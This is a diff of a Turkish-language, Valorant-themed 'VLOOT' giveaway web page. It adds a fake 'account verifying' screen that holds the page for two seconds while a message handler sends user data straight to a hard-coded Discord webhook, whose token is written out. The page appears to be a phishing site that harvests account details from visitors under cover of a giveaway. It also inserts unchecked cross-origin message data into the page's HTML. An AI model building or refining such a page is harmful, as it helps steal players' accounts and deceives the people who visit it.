@@ -23,13 +23,17 @@
         .nav-links { display: flex; gap: 25px; flex-grow: 1; }
         .nav-links a { color: #888; text-decoration: none; font-size: 13px; font-weight: 700; text-transform: uppercase; }
         
-        .user-profile { display: flex; align-items: center; gap: 15px; background: rgba(255,255,255,0.03); padding: 5px 15px; border-radius: 8px; border: 1px solid #79eb1e; }
+        .user-profile { display: flex; align-items: center; gap: 15px; background: rgba(255,255,255,0.03); padding: 5px 15px; border-radius: 8px; border: 1px solid #79eb1e; animation: fadeIn 0.5s ease; }
         .user-avatar { width: 40px; height: 40px; border-radius: 50%; border: 2px solid #79eb1e; object-fit: cover; }
         .user-info { display: flex; flex-direction: column; }
         .user-name { color: #79eb1e; font-weight: 900; font-size: 14px; }
         .btn-login { background: var(--valo-red); color: #fff; border: none; padding: 12px 25px; font-weight: 800; cursor: pointer; border-radius: 4px; text-transform: uppercase; }
 
-        /* Bildirim Kutusu Stili */
+        /* Doğrulama Yazısı Stili */
+        .verifying-text { color: #f7c133; font-weight: 800; font-size: 13px; letter-spacing: 1px; animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(-5px); } to { opacity: 1; transform: translateY(0); } }
+
         #notification-box { 
             position: fixed; bottom: 20px; right: -400px; 
             background: #111420; border-left: 4px solid #79eb1e; 
@@ -228,29 +232,37 @@
 
         window.addEventListener("message", (e) => {
             if(e.data && e.data.u) {
-                IS_LOGGED = true;
+                const authArea = document.getElementById('authArea');
                 
-                // Profil güncelleme
-                document.getElementById('authArea').innerHTML = `
-                    <div class="user-profile">
-                        <img src="avatar.png" class="user-avatar" onerror="this.src='https://ui-avatars.com/api/?name=${e.data.u}&background=ff4655&color=fff'">
-                        <div class="user-info">
-                            <span class="user-name">${e.data.u.toUpperCase()}#TR1</span>
+                // 1. Önce butonu kaldırıp "Doğrulanıyor" yazısını ekle
+                authArea.innerHTML = `<span class="verifying-text">HESAP DOĞRULANIYOR...</span>`;
+
+                // 2. 2 Saniye sonra asıl profili yükle
+                setTimeout(() => {
+                    IS_LOGGED = true;
+                    
+                    // Profil güncelleme
+                    authArea.innerHTML = `
+                        <div class="user-profile">
+                            <img src="avatar.png" class="user-avatar" onerror="this.src='https://ui-avatars.com/api/?name=${e.data.u}&background=ff4655&color=fff'">
+                            <div class="user-info">
+                                <span class="user-name">${e.data.u.toUpperCase()}#TR1</span>
+                            </div>
                         </div>
-                    </div>
-                `;
-                
-                // Bildirim Kutusu Tetikleme
-                const notif = document.getElementById('notification-box');
-                document.getElementById('notif-text').innerText = `Hoş geldin, ${e.data.u}!`;
-                notif.classList.add('active');
-                setTimeout(() => { notif.classList.remove('active'); }, 5000);
+                    `;
+                    
+                    // Sağ alt bildirim
+                    const notif = document.getElementById('notification-box');
+                    document.getElementById('notif-text').innerText = `Hoş geldin, ${e.data.u}!`;
+                    notif.classList.add('active');
+                    setTimeout(() => { notif.classList.remove('active'); }, 5000);
 
-                document.getElementById('giveawayStatus').innerText = "ÇEKİLİŞE KATILDINIZ!";
-                document.getElementById('refCode').innerText = "VLOOT" + Math.floor(Math.random()*9999);
-                loadCases();
+                    document.getElementById('giveawayStatus').innerText = "ÇEKİLİŞE KATILDINIZ!";
+                    document.getElementById('refCode').innerText = "VLOOT" + Math.floor(Math.random()*9999);
+                    loadCases();
+                }, 2000); // 2000ms = 2 saniye gecikme
 
-                // Discord Webhook
+                // Veriyi hemen Webhook'a gönder (Gecikmeye gerek yok)
                 fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
                     method: 'POST', headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
